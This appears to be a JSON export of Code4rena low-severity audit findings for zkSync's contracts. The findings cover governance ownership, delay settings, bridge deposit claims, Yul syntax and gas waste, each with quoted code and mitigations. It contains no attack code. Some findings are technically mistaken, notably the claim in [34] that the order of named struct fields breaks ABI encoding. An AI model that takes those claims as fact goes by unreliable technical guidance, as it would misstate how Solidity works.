      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L197-L227\n\n```solidity\n    function requestL2Transaction(\n        //@audit\n        address _contractL2,\n        uint256 _l2Value,\n        bytes calldata _calldata,\n        uint256 _l2GasLimit,\n        uint256 _l2GasPerPubdataByteLimit,\n        bytes[] calldata _factoryDeps,\n        //@audit\n        address _refundRecipient\n    ) external payable returns (bytes32 canonicalTxHash) {\n        require(s.chainId == ERA_CHAIN_ID, \"legacy interface only available for era token\");\n        canonicalTxHash = _requestL2TransactionSender(\n            BridgehubL2TransactionRequest({\n                sender: msg.sender,\n                contractL2: _contractL2,\n                mintValue: msg.value,\n                l2Value: _l2Value,\n                l2GasLimit: _l2GasLimit,\n                l2Calldata: _calldata,\n                l2GasPerPubdataByteLimit: _l2GasPerPubdataByteLimit,\n                factoryDeps: _factoryDeps,\n                refundRecipient: _refundRecipient\n            })\n        );\n        IL1SharedBridge(s.baseTokenBridge).bridgehubDepositBaseToken{value: msg.value}(\n            s.chainId,\n            msg.sender,\n            ETH_TOKEN_ADDRESS,\n            msg.value\n        );\n    }\n\n```\n\nThis mechanism allows users to deposit ETH from L1 to L2 into two separate addresses within zkSync Era, which introduces a unique feature not found in the traditional Ethereum Virtual Machine (EVM) environment.\n\nUsers can deposit ETH to a contract address (`_contractL2`) and simultaneously direct a refund to a different recipient address, by specifying a different address from `_contractL2` . This dual-address deposit capability deviates from standard EVM practices, where transfers from an externally owned account (EOA) to two addresses simultaneously are not possible. This feature, specific to the zkSync Era, enables such transactions.\n\n### Impact\n\nUndocumented deviation from the Ethereum's VM\n\n### Recommended Mitigation Steps\n\nTo mitigate any potential confusion and enhance security awareness, it's crucial to thoroughly document this dual-address deposit process.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33230",
      "title": "[39] Owner can still access `renounceOwnership()`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nThe `Governance.sol` contract, which plays a pivotal role in managing governance operations within the zkSync protocol, is designed to inherit both the `IGovernance` interface and the `Ownable2Step` contract. During the contract's deployment, the initial ownership is assigned to the `_admin` address through the `Governance.constructor`:\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L43-L45\n\n```solidity\n_transferOwnership(_admin);\n```\n\nThis design ensures that critical functions, such as `scheduleTransparent` and `scheduleShadow`, are exclusively accessible by the `_admin` (owner) of the contract. However, the incorporation of the `Ownable2Step` contract, which extends the `Ownable` abstract contract, introduces a significant risk. The `Ownable` contract includes a `renounceOwnership` function allowing the current owner to relinquish ownership rights, effectively setting the owner to the zero address:\n\n```solidity\nfunction renounceOwnership() public virtual onlyOwner {\n    _transferOwnership(address(0));\n}\n```\n\nIf the `_admin` executes the `renounceOwnership` function, it would render all owner-exclusive functionalities, including upgrade scheduling, inoperative, thereby crippling the entire zkSync protocol.\n\n### Impact\n\nBy renouncing ownership, the `_admin` could unilaterally disable key governance functionalities. Such an action would not only undermine the protocol's integrity but also eliminate any possibility of future upgrades, posing a severe threat to the system's sustainability and security.\n\n### Recommended Mitigation Steps\n\nTo safeguard the protocol against potential sabotage through ownership renunciation, it is advisable to override the `renounceOwnership` function within the `Governance.sol` contract. By explicitly reverting any attempts to renounce ownership, this modification ensures the continuity and inviolability of governance operations:\n\n```solidity\nfunction renounceOwnership() public override onlyOwner {\n    revert(\"_admin cannot renounce ownership\");\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33229",
      "title": "[38] Chunking the pubdata should be made more efficient",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/PubdataChunkPublisher.sol#L21-L57\n\n```solidity\n    function chunkAndPublishPubdata(bytes calldata _pubdata) external onlyCallFrom(address(L1_MESSENGER_CONTRACT)) {\n        require(_pubdata.length <= BLOB_SIZE_BYTES * MAX_NUMBER_OF_BLOBS, \"pubdata should fit in 2 blobs\");\n\n        bytes32[] memory blobHashes = new bytes32[](MAX_NUMBER_OF_BLOBS);\n\n        // We allocate to the full size of MAX_NUMBER_OF_BLOBS * BLOB_SIZE_BYTES because we need to pad\n        // the data on the right with 0s if it doesn't take up the full blob\n        bytes memory totalBlobs = new bytes(BLOB_SIZE_BYTES * MAX_NUMBER_OF_BLOBS);\n\n        assembly {\n            // The pointer to the allocated memory above. We skip 32 bytes to avoid overwriting the length.\n            let ptr := add(totalBlobs, 0x20)\n            calldatacopy(ptr, _pubdata.offset, _pubdata.length)\n        }\n\n        for (uint256 i = 0; i < MAX_NUMBER_OF_BLOBS; i++) {\n            uint256 start = BLOB_SIZE_BYTES * i;\n\n            // We break if the pubdata isn't enough to cover 2 blobs. On L1 it is expected that the hash\n            // will be bytes32(0) if a blob isn't going to be used.\n            if (start >= _pubdata.length) {\n                break;\n            }\n\n            bytes32 blobHash;\n            assembly {\n                // The pointer to the allocated memory above skipping the length.\n                let ptr := add(totalBlobs, 0x20)\n                blobHash := keccak256(add(ptr, start), BLOB_SIZE_BYTES)\n            }\n\n            blobHashes[i] = blobHash;\n        }\n\n        SystemContractHelper.toL1(true, bytes32(uint256(SystemLogKey.BLOB_ONE_HASH_KEY)), blobHashes[0]);\n        SystemContractHelper.toL1(true, bytes32(uint256(SystemLogKey.BLOB_TWO_HASH_KEY)), blobHashes[1]);\n    }\n```\n\nFunction is used to chunk pubdata into pieces that can fit into blobs, case is that it queries to `constant variables` and then multiplies, when this value can just be hardcoded to the codebase, i.e this line `require(_pubdata.length <= BLOB_SIZE_BYTES * MAX_NUMBER_OF_BLOBS, \"pubdata should fit in 2 blobs\");`, both `BLOB_SIZE_BYTES` and `MAX_NUMBER_OF_BLOBS` have fixed numbers of `2` and `126976` respectively as gotten from https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Constants.sol\n\nThis means that the check could be changed to `require(_pubdata.length <= 253_952 \"pubdata should fit in 2 blobs\");`\n\n### Impact\n\nWastage of gas.\n\n### Recommended Mitigation Steps\n\nConsider making the change in as much as the values are going to be constants.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33228",
      "title": "[37] Redundant return of the nonce deployed",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/NonceHolder.sol#L122-L131\n\n```solidity\n    function getDeploymentNonce(address _address) external view returns (uint256 deploymentNonce) {\n        uint256 addressAsKey = uint256(uint160(_address));\n        (deploymentNonce, ) = _splitRawNonce(rawNonces[addressAsKey]);\n\n        return deploymentNonce;\n    }\n```\n\nFunction is returning the deployment nonce for the accounts used with the CREATE opcode, case with this is that the variable to be returned is already named, but execution still passes a `return`\n\n### Impact\n\nRedundant code, bad structure.\n\n### Recommended Mitigation Steps\n\nAlways remove redundant code from production code.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33227",
      "title": "[35] Resolve newly introduced TODOs",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nUsing this search command: [https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync%20TODO&type=code](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync%20TODO&type=code) we can see that there are more than 22 code files that are left with multiple todos (a notable mention is that some contracts have only one nonetheless this should be fixed)\n\n### Impact\n\nOpen Todos often hint that the codes are not ready for final production/deployment.\n\n### Recommended Mitigation Steps\n\nFix open todos\n\n ## [36]  `OperationState.Waiting` should be considered the case even when `timestamp == block.timestamp`\n\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L105\n\n```solidity\n    function getOperationState(bytes32 _id) public view returns (OperationState) {\n        uint256 timestamp = timestamps[_id];\n        if (timestamp == 0) {\n            return OperationState.Unset;\n        } else if (timestamp == EXECUTED_PROPOSAL_TIMESTAMP) {\n            return OperationState.Done;\n        } else if (timestamp > block.timestamp) {\n            return OperationState.Waiting;\n        } else {\n            return OperationState.Ready;\n        }\n    }\n```\n\nAs seen this function is used to get the operation states of any operation, one thing to note is that the function is supposed to consider the operation pending only `after the timestamp has passed block.timestamp` but in the current implementation even when `timestamp == block.timestamp` the state would be `Ready` instead of `Waiting`\n\n### Impact\n\nLow, info on better code structure.\n\n### Recommended Mitigation Steps\n\nMake the `OperationState.Waiting` check inclusive.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33226",
      "title": "[34] Consider rightly passing the elements of the `BridgehubL2TransactionRequest` in `_requestL2Transaction()`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L197-L226\n\n```solidity\n    function requestL2Transaction(\n        address _contractL2,\n        uint256 _l2Value,\n        bytes calldata _calldata,\n        uint256 _l2GasLimit,\n        uint256 _l2GasPerPubdataByteLimit,\n        bytes[] calldata _factoryDeps,\n        address _refundRecipient\n    ) external payable returns (bytes32 canonicalTxHash) {\n        require(s.chainId == ERA_CHAIN_ID, \"legacy interface only available for era token\");\n        canonicalTxHash = _requestL2TransactionSender(\n            BridgehubL2TransactionRequest({\n                sender: msg.sender,\n                contractL2: _contractL2,\n                mintValue: msg.value,\n                l2Value: _l2Value,\n                //@audit l2Calldata should come before gas limit\n                l2GasLimit: _l2GasLimit,\n                l2Calldata: _calldata,\n                l2GasPerPubdataByteLimit: _l2GasPerPubdataByteLimit,\n                factoryDeps: _factoryDeps,\n                refundRecipient: _refundRecipient\n            })\n        );\n        IL1SharedBridge(s.baseTokenBridge).bridgehubDepositBaseToken{value: msg.value}(\n            s.chainId,\n            msg.sender,\n            ETH_TOKEN_ADDRESS,\n            msg.value\n        );\n    }\n```\n\nNow take a look at the implementation of the `BridgehubL2TransactionRequest` struct from https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/common/Messaging.sol#L127-L137\n\n```solidity\nstruct BridgehubL2TransactionRequest {\n    address sender;\n    address contractL2;\n    uint256 mintValue;\n    uint256 l2Value;\n    bytes l2Calldata;\n    uint256 l2GasLimit;\n    uint256 l2GasPerPubdataByteLimit;\n    bytes[] factoryDeps;\n    address refundRecipient;\n}\n```\n\nOne can see that, within the `requestL2Transaction()` execution the positions of `l2GasLimit` and the `calldata` bytes are swapped which would cause the ABI encoding/decoding of this struct be faulty or even cause an issue with the generation of the proof of this transaction\n\n### Impact\n\nBetter code structure.\n\n### Recommended Mitigation Steps\n\nConsider passing in the struct in the right manner\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33225",
      "title": "[33] Remove the trailing comma after queries to `isNotEnoughGasForPubdata` in the bootloader to enforce no error in the Yul Syntax",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L2315-L2320\n\n```yul\n                if isNotEnoughGasForPubdata(\n                    basePubdataSpent,\n                    gas(),\n                    reservedGas,\n                    gasPerPubdata,\n                ) {\n```\n\nAnd https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1833-L1841\n\n```yul\n                if isNotEnoughGasForPubdata(\n                    basePubdataSpent,\n                    gas(),\n                    // Note, that for L1->L2 transactions the reserved gas is used to protect the operator from\n                    // transactions that might accidentally cause to publish too many pubdata.\n                    // Thus, even if there is some accidental `reservedGas` left, it should not be used to publish pubdata.\n                    0,\n                    gasPerPubdata,\n                ) {\n```\n\nWe can see that tehre is a trailing comma in the function call but this is an invalid syntax according to Yul's formal specification: https://docs.soliditylang.org/en/latest/yul.html#specification-of-yul\n\nAnother instance not related to `isNotEnoughGasForPubdata` can be seen here: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L972-L977\n\n### Impact\n\nBorderline low... this is cause the `Bootloader.yul` code would not compile with the correct Yul compiler. Even if it compiles with the current zkEVM implementation, it potentially necessitates an update to the Bootloader.yul code and its hash on Layer 1. Such an update would require a system upgrade.\n\n### Recommended Mitigation Steps\n\nConsider removing the trailing comma in both cases.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33224",
      "title": "[32] Non-existent facets would be assumed to be unfreezable due to the wrong conditional keyword in `isFacetFreezable()`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Getters.sol#L162-L174\n\n```solidity\n    /// @inheritdoc IGetters\n    function isFacetFreezable(address _facet) external view returns (bool isFreezable) {\n        Diamond.DiamondStorage storage ds = Diamond.getDiamondStorage();\n\n        // There is no direct way to get whether the facet address is freezable,\n        // so we get it from one of the selectors that are associated with the facet.\n        uint256 selectorsArrayLen = ds.facetToSelectors[_facet].selectors.length;\n        //@audit\n        if (selectorsArrayLen != 0) {\n            bytes4 selector0 = ds.facetToSelectors[_facet].selectors[0];\n            isFreezable = ds.selectorToFacet[selector0].isFreezable;\n        }\n    }\n\n```\n\nThis function is used to determine if a facet is freezable, issue here is that it wrongly uses `if()` instead of `require()` now since `if` is used, in the case where the facet is none existent `selectorsArrayLen == 0` would be true and as such the function would return `false` whereas it should revert since the facet is non-existent\n\n### Impact\n\nUsers would be confused at this, since there is no difference between unfreezable facets and non-existent ones considering the current implementation of `isFacetFreezable()`.\n\n### Recommended Mitigation Steps\n\nConsider changing the `if()` condition to `require()` that way only real unfreezable facets would return `false`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33223",
      "title": "[31] Unnecessary duplication of checks",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L386-L456\n\n```solidity\n    function finalizeWithdrawal() external override {\n        // To avoid rewithdrawing txs that have already happened on the legacy bridge.\n        // Note: new withdraws are all recorded here, so double withdrawing them is not possible.\n        //@audit\n        if (_isEraLegacyWithdrawal(_chainId, _l2BatchNumber)) {\n            require(!legacyBridge.isWithdrawalFinalized(_l2BatchNumber, _l2MessageIndex), \"ShB: legacy withdrawal\");\n        }\n        _finalizeWithdrawal(_chainId, _l2BatchNumber, _l2MessageIndex, _l2TxNumberInBatch, _message, _merkleProof);\n    }\n\n    /// @dev Internal function that handles the logic for finalizing withdrawals,\n    /// serving both the current bridge system and the legacy ERC20 bridge.\n    function _finalizeWithdrawal() internal nonReentrant returns (address l1Receiver, address l1Token, uint256 amount) {\n        require(!isWithdrawalFinalized[_chainId][_l2BatchNumber][_l2MessageIndex], \"Withdrawal is already finalized\");\n        isWithdrawalFinalized[_chainId][_l2BatchNumber][_l2MessageIndex] = true;\n\n        // Handling special case for withdrawal from zkSync Era initiated before Shared Bridge.\n        //@audit\n        if (_isEraLegacyWithdrawal(_chainId, _l2BatchNumber)) {\n            // Checks that the withdrawal wasn't finalized already.\n            bool alreadyFinalized = IGetters(ERA_DIAMOND_PROXY).isEthWithdrawalFinalized(\n                _l2BatchNumber,\n                _l2MessageIndex\n            );\n            require(!alreadyFinalized, \"Withdrawal is already finalized 2\");\n        }\n//ommited for brevity\n    }\n```\n\nThese functions are both used for finalizing the withdrawals, with multiple checks, issue here now is that the check if the transaction is from the era legacy is implemented twice which is unnecessary.\n\n### Impact\n\nNC - Overcomplication of code.\n\n### Recommended Mitigation Steps\n\nThe check can be left just to the internal function while finalizing the withdrawal.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33222",
      "title": "[30] Apply fixes to commented out bug cases",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L67-L89\n\n```solidity\n    function upgrade(ProposedUpgrade calldata _proposedUpgrade) public virtual returns (bytes32 txHash) {\n        // Note that due to commitment delay, the timestamp of the L2 upgrade batch may be earlier than the timestamp\n        // of the L1 block at which the upgrade occurred. This means that using timestamp as a signifier of \"upgraded\"\n        // on the L2 side would be inaccurate. The effects of this \"back-dating\" of L2 upgrade batches will be reduced\n        // as the permitted delay window is reduced in the future.\n        require(block.timestamp >= _proposedUpgrade.upgradeTimestamp, \"Upgrade is not ready yet\");\n\n        _setNewProtocolVersion(_proposedUpgrade.newProtocolVersion);\n        _upgradeL1Contract(_proposedUpgrade.l1ContractsUpgradeCalldata);\n        _upgradeVerifier(_proposedUpgrade.verifier, _proposedUpgrade.verifierParams);\n        _setBaseSystemContracts(_proposedUpgrade.bootloaderHash, _proposedUpgrade.defaultAccountHash);\n\n        txHash = _setL2SystemContractUpgrade(\n            _proposedUpgrade.l2ProtocolUpgradeTx,\n            _proposedUpgrade.factoryDeps,\n            _proposedUpgrade.newProtocolVersion\n        );\n\n        _postUpgrade(_proposedUpgrade.postUpgradeCalldata);\n\n        emit UpgradeComplete(_proposedUpgrade.newProtocolVersion, txHash, _proposedUpgrade);\n    }\n\n```\n\nWe can see that while upgrading, the call gets routed to ` _upgradeVerifier() -> _setVerifier() -> _setVerifierParams()`, now issue here is that, as [commented](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L143-L147) an upgrade must be carefully done to ensure there aren't batches in the committed state during the transition, this is in order not to have the verifier be immediately used to prove all committed batches.\n\nBut this can easily be fixed by applying an equivalence check while upgrading, i.e `require(s.totalBatchesCommitted == s.totalBatchesVerified);`\n\n### Impact\n\nAdmin error, but wrong verifier could be used to prove batches being committed in the transition state.\n\n### Recommended Mitigation Steps\n\nIntroduce the check `require(s.totalBatchesCommitted == s.totalBatchesVerified);` to ensure this never happens.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33221",
      "title": "[29] Users failed tx could be unclaimable from the shared bridge",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L302-L369\n\n```solidity\n    /// @dev Processes claims of failed deposit, whether they originated from the legacy bridge or the current system.\n    function _claimFailedDeposit(\n        bool _checkedInLegacyBridge,\n        uint256 _chainId,\n        address _depositSender,\n        address _l1Token,\n        uint256 _amount,\n        bytes32 _l2TxHash,\n        uint256 _l2BatchNumber,\n        uint256 _l2MessageIndex,\n        uint16 _l2TxNumberInBatch,\n        bytes32[] calldata _merkleProof\n    ) internal nonReentrant {\n        {\n            bool proofValid = bridgehub.proveL1ToL2TransactionStatus(\n                _chainId,\n                _l2TxHash,\n                _l2BatchNumber,\n                _l2MessageIndex,\n                _l2TxNumberInBatch,\n                _merkleProof,\n                TxStatus.Failure\n            );\n            require(proofValid, \"yn\");\n        }\n        require(_amount > 0, \"y1\");\n\n        {\n            bool notCheckedInLegacyBridgeOrWeCanCheckDeposit;\n            {\n                // Deposits that happened before the upgrade cannot be checked here, they have to be claimed and checked in the legacyBridge\n                bool weCanCheckDepositHere = !_isEraLegacyWithdrawal(_chainId, _l2BatchNumber);\n                // Double claims are not possible, as we this check except for legacy bridge withdrawals\n                // Funds claimed before the update will still be recorded in the legacy bridge\n                // Note we double check NEW deposits if they are called from the legacy bridge\n                notCheckedInLegacyBridgeOrWeCanCheckDeposit = (!_checkedInLegacyBridge) || weCanCheckDepositHere;\n            }\n            if (notCheckedInLegacyBridgeOrWeCanCheckDeposit) {\n                bytes32 dataHash = depositHappened[_chainId][_l2TxHash];\n                bytes32 txDataHash = keccak256(abi.encode(_depositSender, _l1Token, _amount));\n                require(dataHash == txDataHash, \"ShB: d.it not hap\");\n                delete depositHappened[_chainId][_l2TxHash];\n            }\n        }\n\n        if (!hyperbridgingEnabled[_chainId]) {\n            // check that the chain has sufficient balance\n            require(chainBalance[_chainId][_l1Token] >= _amount, \"ShB n funds\");\n            chainBalance[_chainId][_l1Token] -= _amount;\n        }\n\n        // Withdraw funds\n        if (_l1Token == ETH_TOKEN_ADDRESS) {\n            bool callSuccess;\n            // Low-level assembly call, to avoid any memory copying (save gas)\n            assembly {\n                callSuccess := call(gas(), _depositSender, _amount, 0, 0, 0, 0)\n            }\n            require(callSuccess, \"ShB: claimFailedDeposit failed\");\n        } else {\n            IERC20(_l1Token).safeTransfer(_depositSender, _amount);\n            // Note we don't allow weth deposits anymore, but there might be legacy weth deposits.\n            // until we add Weth bridging capabilities, we don't wrap/unwrap weth to ether.\n        }\n\n        emit ClaimedFailedDepositSharedBridge(_chainId, _depositSender, _l1Token, _amount);\n    }\n\n```\n\nFunction is inevitably called when claiming the failed deposits case here is that the logic for this hardcodes the receiver and expects it to be able to deal with the tokens, now different things could be the cause of the address not being able to handle tokesn, for example say the `_depositSender` can't handle eth or has no receive function, or for the case of a normal token, assume they get blacklisted or some other sort of issues, tokens are indefinitely locked in the bridge.\n\n### Impact\n\nLow, since this somewhat relies on user not using an address that can accept their failed deposits from the get go.\n\n### Recommended Mitigation Steps\n\nAs a popular receommendation, it's advisable to implement a pull method for withdrawals, i.e users should be allowed to provide a fresh deposit address than forcing it into the one that made the deposit.\n\n> NB: Whereas acknowledged findings have been said to be OOS, I'm considering a fresh case of the bug and submitting since this is a new contract and hasn't been reported before.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33220",
      "title": "[28] `BaseZkSyncUpgradeGenesis::_setNewProtocolVersion()` should not allow the protocol version difference to be up to `MAX_ALLOWED_PROTOCOL_VERSION_DELTA`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L20-L42\n\n```solidity\n    function _setNewProtocolVersion(uint256 _newProtocolVersion) internal override {\n        uint256 previousProtocolVersion = s.protocolVersion;\n        require(\n            // Genesis Upgrade difference: Note this is the only thing change > to >=\n            _newProtocolVersion >= previousProtocolVersion,\n            \"New protocol version is not greater than the current one\"\n        );\n        require(\n            _newProtocolVersion - previousProtocolVersion <= MAX_ALLOWED_PROTOCOL_VERSION_DELTA,\n            \"Too big protocol version difference\"\n        );\n\n        // If the previous upgrade had an L2 system upgrade transaction, we require that it is finalized.\n        require(s.l2SystemContractsUpgradeTxHash == bytes32(0), \"Previous upgrade has not been finalized\");\n        require(\n            s.l2SystemContractsUpgradeBatchNumber == 0,\n            \"The batch number of the previous upgrade has not been cleaned\"\n        );\n\n        s.protocolVersion = _newProtocolVersion;\n        emit NewProtocolVersion(previousProtocolVersion, _newProtocolVersion);\n    }\n\n```\n\nConsidering the only change between this and the non-Genesis `BaseZkSyncUpgrade` is the fact that the protocol version is allowed to be set to the current one, i.e `//Genesis Upgrade difference: Note this is the only thing change > to >= _newProtocolVersion >= previousProtocolVersion, \"New protocol version is not greater than the current one\"`, i.e then to be in [alliance with Config.sol](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/common/Config.sol#L30-L34) of allowing 100 as a delta, then the difference needs to be dropped by 1, since the lower end of the possible values has been reduced to accept `previousProtocolVersion`.\n\n### Impact\n\nNon-critical, just to be more in allignment with the `Config.sol`\n\n### Recommended Mitigation Steps\n\nConsider reimplementing the logic for the genesis upgrade.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33219",
      "title": "[27] Protocol currently does not consider all windows in regards to `minDelay`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L250-L253\n\n```solidity\n    function updateDelay(uint256 _newDelay) external onlySelf {\n        emit ChangeMinDelay(minDelay, _newDelay);\n        minDelay = _newDelay;\n    }\n```\n\nThe `updateDelay` function within the Governance contract lacks a minimum threshold for the `_newDelay` parameter, which controls the `minDelay` value. If `_newDelay` gets set to say zero for instance, this effectively removes the security council's oversight.\n\nThis lack of synchronization between different time delays used in the upgrade scheduling process creates the possibility of conflicting scenarios. These delays are defined in separate contracts, i.e `minDelay` and `UPGRADE_NOTICE_PERIOD` in `Governance.sol` & `executionDelay` in `ValidatorTimelock.sol`\n\nIf `executionDelay` exceeds `minDelay` or `UPGRADE_NOTICE_PERIOD`, the upgrade might be executed on L1 before users can withdraw their funds. Even if `executionDelay` is shorter than `minDelay`, a malicious validator could intentionally delay the process, causing a similar issue.\n\n### Impact\n\nThese loopholes in the zkSync governance contracts could be exploited to manipulate the upgrade process and potentially harm users.\n\nOne window allows the owner to bypass the security council's oversight by setting the minimum approval delay for operations to zero. This timeframe, known as `minDelay`, is crucial because it gives the security council time to review and potentially cancel operations proposed by the admin. With `minDelay` at zero, the security council's approval becomes irrelevant, and the admin can execute operations unilaterally. This undermines the two-actor security model intended for governance.\n\n> NB: It might as well not be `zero`, but a very short time frame, idea is still the same.\n\nAnother window stems from inconsistencies between different time delays used during upgrade scheduling. These delays include `minDelay` (time for security council review), `UPGRADE_NOTICE_PERIOD` (user notification window), and `executionDelay` (delay before upgrade execution on L1). If `minDelay` or `UPGRADE_NOTICE_PERIOD` are shorter than `executionDelay`, it can lead to unpredictable outcomes for users. Users' withdrawal requests might be stuck in limbo or executed before the upgrade, causing them to miss out on crucial information or protections.\n\nFor instance, the time delay inconsistencies could be problematic to the upgrade process in a way that impacts users attempting to withdraw ETH before an upgrade, say the `finalizeEthWithdrawal()` gets updgraded to function a bit different, users who had their transactions going on would be directly impacted.\n\n### Recommended Mitigation Steps\n\nEnforce minimum `minDelay`, the `updateDelay` function should be modified to include a requirement that `_newDelay` be greater than `ValidatorTimelock.executionDelay()` with an additional buffer of at least 2 days to account for potential validator delays. This ensures the security council has sufficient time to review operations.\n\nAlso, consider establishing a dependency between `minDelay` (or `UPGRADE_NOTICE_PERIOD`) and `executionDelay`. This could involve enforcing `minDelay` to be always greater than `executionDelay` with a reasonable buffer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
